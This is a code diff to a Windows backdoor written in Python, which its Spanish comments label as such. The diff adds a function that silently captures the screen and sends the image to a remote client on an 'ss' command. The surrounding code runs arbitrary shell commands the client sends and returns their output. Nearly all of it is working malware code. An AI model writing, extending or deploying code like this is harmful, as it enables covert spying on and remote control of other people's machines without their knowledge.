@@ -6,11 +6,25 @@ import threading
 import platform
 import re
 import sys
+from pyautogui import screenshot
 
 # codigo para puerta trasera (solo windows)
 # pensado solo para ejecucion dentro de la red local, el equipo en este caso es el que va a actuar como server
 # no esta preparado para escuchar fuera de la red privada, no recomiendo
 # "Estamos hack" - Autor: Matias Urbaneja (Urb@n) - # https://github.com/Urban20
+
+def capturar_pant():
+    try:
+        nombre_img = 'ss.jpg'
+        img= screenshot()
+        #img = img.resize((1920,1080))
+        img.save(nombre_img,)
+        
+        with open(nombre_img,'rb') as img_arch:
+            imagen = img_arch.read()
+        os.remove(nombre_img)
+        return imagen
+    except: pass
 
 nombre_exe = re.search(r'(\w+\.pyw?)|(\w+\.exe)',sys.argv[0]).group() # nombre que tendra el ejecutable, debe coincidir o la operacion mover_dir() falla
 
@@ -45,6 +59,16 @@ def escucha(cliente):
                 cliente.send(f'\n[!] nueva ruta>> {ruta}\n'.encode())
             except Exception as e:
                 cliente.send(f'\n[!] error cambiando el directorio de trabajo:\n{e}\n'.encode())
+        elif señal == 'ss':
+            
+            try:
+                byte = capturar_pant()
+                cliente.sendall(len(byte).to_bytes(length=8,byteorder="big")) # tamaño de img : int a bytes , debe coincidir del otro lado
+                cliente.send(byte) # envia la imagen en bytes
+
+            except: cliente.sendall('fallo al enviar imagen'.encode())
+            
+
         else:
             comando = subprocess.check_output(señal.split(' '),text=True,shell=True) # comando recibido por el cliente
             cliente.send(comando.encode()) # envio de la salida del backdoor al cliente
